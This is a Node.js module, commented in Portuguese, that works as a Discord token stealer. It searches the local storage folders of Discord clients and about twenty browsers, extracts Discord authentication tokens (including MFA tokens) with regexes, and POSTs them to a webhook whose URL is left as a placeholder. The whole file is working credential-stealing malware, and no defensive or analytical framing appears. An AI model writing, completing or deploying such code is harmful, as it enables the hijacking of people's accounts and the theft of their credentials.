const fs = require('fs')
const path = require('path')
const axios = require('axios')

async function discordtokens() {
  const tokens = []
  const local = process.env.LOCALAPPDATA || process.env.HOME || ''
  const roaming = process.env.APPDATA || process.env.HOME || ''

  let caminhos = {}

  if (!local || !roaming) {
    console.log('Variáveis de ambiente LOCALAPPDATA/APPDATA não encontradas. Executando apenas para Discord...')
    caminhos = {
      discord: path.join(process.env.HOME || '', '.config', 'discord'),
      discord_canary: path.join(process.env.HOME || '', '.config', 'discordcanary'),
      discord_ptb: path.join(process.env.HOME || '', '.config', 'discordptb')
    }
  } else {
    caminhos = {
      discord: path.join(roaming, 'Discord'),
      discord_canary: path.join(roaming, 'discordcanary'),
      discord_ptb: path.join(roaming, 'discordptb'),
      chrome: path.join(local, 'Google', 'Chrome', 'User Data', 'Default'),
      opera: path.join(roaming, 'Opera Software', 'Opera Stable'),
      brave: path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
      yandex: path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
      lightcord: path.join(roaming, 'Lightcord'),
      opera_gx: path.join(roaming, 'Opera Software', 'Opera GX Stable'),
      amigo: path.join(local, 'Amigo', 'User Data'),
      torch: path.join(local, 'Torch', 'User Data'),
      kometa: path.join(local, 'Kometa', 'User Data'),
      orbitum: path.join(local, 'Orbitum', 'User Data'),
      centbrowser: path.join(local, 'CentBrowser', 'User Data'),
      sputnik: path.join(local, 'Sputnik', 'Sputnik', 'User Data'),
      chrome_sxs: path.join(local, 'Google', 'Chrome SxS', 'User Data'),
      epic: path.join(local, 'Epic Privacy Browser', 'User Data'),
      edge: path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default'),
      uran: path.join(local, 'uCozMedia', 'Uran', 'User Data', 'Default'),
      iridium: path.join(local, 'Iridium', 'User Data', 'Default', 'local Storage', 'leveld'),
      firefox: path.join(roaming, 'Mozilla', 'Firefox', 'Profiles')
    }
  }

  const regexes = [
    /mfa\.[\w-]{84}/g,
    /[A-Za-z\d-]{24}\.[\w-]{6}\.[\w-]{27}/g
  ]

  for (const nome in caminhos) {
    const base = caminhos[nome]
    const caminho = path.join(base, 'Local Storage', 'leveldb')
    if (!fs.existsSync(caminho)) continue

    let arquivos
    try {
      arquivos = fs.readdirSync(caminho)
    } catch {
      continue
    }

    for (const arquivo of arquivos) {
      if (!arquivo.endsWith('.log') && !arquivo.endsWith('.ldb') && !arquivo.endsWith('.sqlite')) continue
      let conteudo
      try {
        conteudo = fs.readFileSync(path.join(caminho, arquivo), 'utf8')
      } catch {
        continue
      }
      for (const regex of regexes) {
        const encontrados = conteudo.match(regex)
        if (!encontrados) continue
        encontrados.forEach(token => {
          if (!tokens.includes(token)) tokens.push(token)
        })
      }
    }
  }

  const dados = {
    content: tokens.length ? tokens.join('\n') : 'Nenhum token encontrado'
  }
  try {
    await axios.post(
      'webhook here',
      dados,
      { headers: { 'content-type': 'application/json' } }
    )
  } catch {}
}

module.exports = { discordtokens }
